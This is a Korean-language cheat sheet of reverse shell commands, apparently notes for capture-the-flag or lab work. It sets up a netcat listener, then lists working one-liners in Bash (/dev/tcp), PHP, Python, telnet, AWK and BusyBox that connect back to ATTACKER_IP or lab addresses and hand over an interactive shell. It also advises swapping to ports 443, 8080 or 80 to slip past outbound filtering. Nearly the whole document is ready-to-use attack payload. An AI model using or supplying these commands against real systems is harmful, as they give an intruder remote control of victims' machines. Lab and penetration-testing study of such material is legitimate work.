# 리버스 셸 명령어 정리

# RS 전 icmp 통신 체크

tcpdump -i tun0 icmp

# step 1 start netcat

nc -lvnp 4444

# 4444 같은 포트는 아예 outbound 에서 막아버릴 수 있으므로 443, 8080, 80 같은 신뢰성 있는 포트로 대체 테스트 필요

# step 2 payload named a pipe reverse shell (Using a reverse or bind shell)

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc [ATTACKER_IP] 4444 >/tmp/f

# step 3 find flag

## Bash

| 유형      | 명령어                                                             | 설명                                                              |
| --------- | ------------------------------------------------------------------ | ----------------------------------------------------------------- | ------------------------------------------- |
| 기본      | `bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1`                         | 대화형 셸을 TCP로 리디렉션, 표준 입출력/에러 모두 공격자에게 전달 |
| Read Line | `exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5                         | while read line; do $line 2>&5 >&5; done`                         | 파일 디스크립터 5로 명령어 단위 비대화형 셸 |
| FD 196    | `0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196` | 임의 FD(196) 사용, 표준 입출력/에러 모두 리디렉션                 |
| FD 5      | `bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5`              | FD 5로 표준 입출력/에러 모두 리디렉션                             |

## PHP

| 유형      | 명령어                                                                 | 설명                                                |
| --------- | ---------------------------------------------------------------------- | --------------------------------------------------- |
| exec 함수 | `php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'` | fsockopen으로 소켓 연결, exec로 셸 실행 및 리디렉션 |
| 기타 함수 | `shell_exec`, `system`, `passthru`, `popen`                            | exec와 유사, 각각 출력 방식만 다름                  |

## Python

| 유형       | 명령어                                                                                                                                                                                                                       | 설명                                                  |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------- |
| 환경변수   | `export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'`  | 환경변수로 IP/포트 지정, 소켓 연결 후 pty로 대화형 셸 |
| subprocess | `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'` | IPv4 TCP 소켓, dup2로 리디렉션, pty로 대화형 셸       |
| 간단형     | `python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`                                                                                 | 위와 동일, 더 간결                                    |

## 기타

| 도구    | 명령어                                                                          | 설명                                            |
| ------- | ------------------------------------------------------------------------------- | ----------------------------------------------- | -------------------------------------------- | ------------------------ | -------------------------------------------------------------- | ---------------------------------------- |
| Telnet  | `TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF                    | sh 1>$TF`                                       | mkfifo로 파이프 생성, telnet으로 양방향 통신 |
| AWK     | `awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" | & s; s                                          | & getline c; if(c){ while ((c                | & getline) > 0) print $0 | & s; close(c); } } while(c != "exit") close(s); }}' /dev/null` | AWK 내장 TCP 기능 활용, 루프/조건문 포함 |
| BusyBox | `busybox nc ATTACKER_IP 443 -e sh`                                              | BusyBox 내장 nc로 -e 옵션 사용, 연결 시 sh 실행 |

---

## 리디렉션 정리

- `>` : 표준 출력(stdout) 리디렉션
- `2>` : 표준 에러(stderr) 리디렉션
- `2>&1` : 표준 에러를 표준 출력과 동일하게 리디렉션 (순서 중요)
- `>&` : Bash에서 표준 출력/에러를 동시에 리디렉션 (예: `>& /dev/tcp/ATTACKER_IP/443`)

### 예시

- `command > file.txt 2>&1` : 표준 출력/에러 모두 file.txt로
- `command >& file.txt` : 위와 동일 (Bash 한정)

---

## 요약

- `>&`는 `2>&1`의 간단 표기법 (Bash 전용)
- 리버스 셸에서 표준 입출력/에러를 모두 공격자에게 전달해야 완전한 양방향 통신 가능
- 복잡한 리디렉션은 공격자와의 완전한 셸 통신을 위해 필수

언어/명령,명령어 (COMMAND)

# 환경에 따라 bash, nc, python, php 설치 여부가 다르므로 항상 된다는 보장이 없음 -> 다양한 RS 준비

```sh
Python,"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'"
Bash,bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
PHP,"php -r '$sock=fsockopen(""10.8.136.212"",1234);exec(""/bin/sh -i <&3 >&3 2>&3"");'"
```
